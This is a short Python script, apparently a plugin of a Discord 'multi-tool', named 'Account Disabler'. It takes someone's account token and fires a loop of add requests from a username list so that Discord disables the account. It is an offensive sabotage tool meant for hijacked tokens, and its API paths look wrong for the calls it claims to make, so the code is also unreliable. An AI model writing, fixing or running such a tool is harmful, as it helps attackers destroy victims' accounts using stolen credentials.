import requests
from util.plugins.common import *
import time

def TokenDisable():
    setTitle("Account Disabler")
    print("Enter account token to disable")
    token = input("Token: ")
    validateToken(token)
    headers = {'Authorization': token, 'Content-Type': 'application/json'}

    retry_attempts = 3
    for attempt in range(1, retry_attempts + 1):
        try:
            res = requests.get('https://discord.com/api/v10/channels/@me/', headers=headers)
            res.raise_for_status()

            user_data = res.json()
            print(f"\nUser Details: {user_data['username']}#{user_data['discriminator']} - ({user_data['id']})")
            input("If These Details Are Correct Press Enter! (This Will Start Disabling The Account, Use At Own Risk!)")
            print()

            with open('assets/users.txt', 'r') as file:
                for username in file.read().splitlines():
                    try:
                        usr = username.split('#')
                        r = requests.put(
                            f'https://discord.com/api/v10/channels/@me/{usr[1]}',
                            headers=headers,
                            json={'username': usr[0]}
                        )
                        r.raise_for_status()
                        print(f"\t{usr[0]}#{usr[1]} Added!")
                    except requests.exceptions.RequestException as err:
                        print(f"Something Went Wrong! Error: {err}")
        except requests.exceptions.RequestException as err:
            print(f"Error connecting to the Discord API. Retrying... (Attempt {attempt}/{retry_attempts})")
            time.sleep(1)  # Wait for a second before retrying
        else:
            print("\n\nAccount successfully disabled")
            input("Press Enter To Exit!")
            return

    print(f"Unable to connect to the Discord API after {retry_attempts} attempts. Exiting.")

